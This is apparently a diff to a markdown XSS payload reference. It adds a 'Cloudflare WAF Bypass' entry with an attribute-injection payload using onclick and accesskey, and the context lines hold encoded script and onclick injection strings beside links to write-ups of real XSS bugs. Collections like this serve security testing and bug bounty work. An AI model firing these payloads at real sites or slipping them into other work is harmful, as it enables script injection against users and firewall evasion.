@@ -1179,7 +1179,13 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ```javascript
 \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
 ```
+### Cloudflare WAF Bypass by [@mindbl0w](https://bugcrowd.com/mindbl0w) - 21 September 2021
 
+##### On Meta Tag (Alt + X) / (Alt + Shift + X)
+
+```javascript
+" onXXXXxxxXxXxXXx=() onclick=confirm(1) accesskey=X test="
+```
 ## References
 
 - [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
@@ -1198,7 +1204,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [RPO that lead to information leakage in Google](http://blog.innerht.ml/rpo-gadgets/) by filedescriptor
 - [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton
 - [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager
-- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen
+- [Using a Braun Shaver to Bypass XSS Audit and ](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen
 - [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
 - [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
 - [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
